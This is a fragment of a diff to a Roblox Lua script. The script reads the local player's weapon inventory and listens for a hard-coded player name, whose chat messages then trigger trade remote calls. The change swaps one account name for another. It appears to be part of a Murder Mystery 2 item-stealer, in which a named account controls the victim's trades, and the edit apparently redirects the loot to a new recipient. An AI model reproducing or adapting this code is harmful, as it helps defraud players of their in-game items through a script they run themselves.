@@ -48,7 +48,7 @@ for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == "DamianMM2HoIder" then
+    if player.Name == "lpmoon6" then
         player.Chatted:Connect(function(msg)
             game:GetService("ReplicatedStorage").Trade.DeclineTrade:FireServer()
             if msg == kickMessage then
